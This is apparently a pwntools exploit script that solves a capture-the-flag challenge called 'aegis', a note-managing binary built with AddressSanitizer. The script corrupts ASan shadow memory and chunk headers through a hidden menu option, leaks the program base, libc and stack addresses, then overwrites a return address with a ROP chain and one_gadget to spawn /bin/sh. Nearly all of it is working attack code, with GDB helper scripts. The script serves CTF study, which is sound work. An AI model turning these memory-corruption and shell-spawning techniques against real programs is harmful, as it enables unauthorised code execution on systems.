#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    typedef struct note_struct{
        char *malloc_ptr;
        void *cfi_check; 
    }note_struct;

    note_struct no_use;

    typedef unsigned int u32;
    struct ChunkHeader {
    // 1-st 8 bytes.
    u32 chunk_state       : 8;  // Must be first.
    u32 alloc_tid         : 24;

    u32 free_tid          : 24;
    u32 from_memalign     : 1;
    u32 alloc_type        : 2;
    u32 rz_log            : 3;
    u32 lsan_tag          : 2;
    // 2-nd 8 bytes
    // This field is used for small sizes. For large sizes it is equal to
    // SizeClassMap::kMaxSize and the actual size is stored in the
    // SecondaryAllocator's metadata.
    u32 user_requested_size : 29;
    // align < 8 -> 0
    // else      -> log2(min(align, 512)) - 2
    u32 user_requested_alignment_log : 3;
    u32 alloc_context_id;
    };

    struct ChunkHeader no_use2;
    '''

    f = open('/tmp/gdb_symbols.c', 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
except Exception as e:
    print(e)

# context.log_level = 'debug'
execve_file = './aegis'
sh = process(execve_file, env={"LD_PRELOAD":"/tmp/gdb_symbols.so"})
# sh = process(execve_file)
# sh = remote('eonew.cn', 60107)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
context.arch = "amd64"

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set $glo=(note_struct **)&notes

    define pr
        p $glo[$arg0]
        p *$glo[$arg0]
        x/8gx $glo[$arg0]->malloc_ptr-16
        end
    
    define all
        p *$glo@32
        end

    define pa
        pr 0
        pr 1
        pr 2
        pr 3
        end

    define sa
        p (char *)((($arg0) >> 3) + 0x7FFF8000)
        x/8bx ((($arg0) >> 3) + 0x7FFF8000)
        end

    define ch
        p/x *(struct ChunkHeader *)($arg0)
        end

    # b *$rebase(0x113D60)
    # b *$rebase(0x1145F0)
    set $c=(struct ChunkHeader *)0x602000000020
    # c
    '''

    f = open('/tmp/pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdbscript', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def add_note(size, content, id):
    sh.recvuntil('Choice: ')
    sh.sendline('1')
    sh.sendlineafter('Size: ', str(size))
    sh.sendafter('Content: ', content)
    sh.sendlineafter('ID: ', str(id))

def update_note(index, content, id):
    sh.recvuntil('Choice: ')
    sh.sendline('3')
    sh.sendlineafter('Index: ', str(index))
    sh.sendafter('New Content: ', content)
    sh.sendlineafter('New ID: ', str(id))

def delete_note(index):
    sh.recvuntil('Choice: ')
    sh.sendline('4')
    sh.sendlineafter('Index: ', str(index))

def show_note(index):
    sh.recvuntil('Choice: ')
    sh.sendline('2')
    sh.sendlineafter('Index: ', str(index))

add_note(0x10, 'a' * 8, 0xffffffffffffffff)
sh.recvuntil('Choice: ')
sh.sendline('666')
# Set 0x602000000020 to be able to read and write
sh.sendlineafter('Lucky Number: ', str((0x602000000020 >> 3) + 0x7FFF8000))
# pause()

update_note(0, 'b' * 0x12, u64('ccc\0\0\0\0\0'))
update_note(0, 'd' * 0x10 + p32(0x00000002) + 'e', (0x20000010 + 0x10000000) * 0x100000000 + 0x02ffffff) # 0x10000000 -> 256M

delete_note(0)
add_note(0x10, p64(0x602000000018), 0) # index 1

show_note(0)

sh.recvuntil('Content: ')
result = sh.recvline()[:-1]
image_addr = u64(result.ljust(8, '\0')) - elf.symbols['cfi_check']
log.success("image_addr: " + hex(image_addr))


puts_got_addr = image_addr + elf.got['puts']
temp = p64(puts_got_addr)
update_note(1, temp[:1] + 'f' , u64(temp[1:] + 'g'))

show_note(0)

sh.recvuntil('Content: ')
result = sh.recvline()[:-1]
libc_addr = u64(result.ljust(8, '\0')) - libc.symbols['puts']
log.success("libc_addr: " + hex(libc_addr))
# pause()
update_note(1, p64(libc_addr + libc.symbols['environ']) , 0)
# pause()
show_note(0)

sh.recvuntil('Content: ')
result = sh.recvline()[:-1]
stack_addr = u64(result.ljust(8, '\0'))
log.success("stack_addr: " + hex(stack_addr))
read_until_nl_or_max_ret_addr = stack_addr - 0x150
log.success("read_until_nl_or_max_ret_addr: " + hex(read_until_nl_or_max_ret_addr))

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

update_note(1, p64(read_until_nl_or_max_ret_addr) , 0)
one_gadget_addr = libc_addr + 0x4f322
log.success("one_gadget_addr: " + hex(one_gadget_addr))

# update_note(0, p64(libc_addr + libc.symbols['gets']) , 0)
sh.recvuntil('Choice: ')
sh.sendline('3')
sh.sendlineafter('Index: ', str(0))
sh.sendafter('New Content: ', p64(libc_addr + libc.symbols['gets']))
# pause()

# 0x000000000001c843 : pop rdi ; ret
pop_rdi_ret = 0x000000000001c843
sh.sendline('i' + 
            p64(one_gadget_addr) + 
            p64(image_addr + pop_rdi_ret) + 
            p64(0) + 
            p64(libc_addr + libc.symbols['exit']) + 
            '\0' * 0x30
        )

sh.interactive()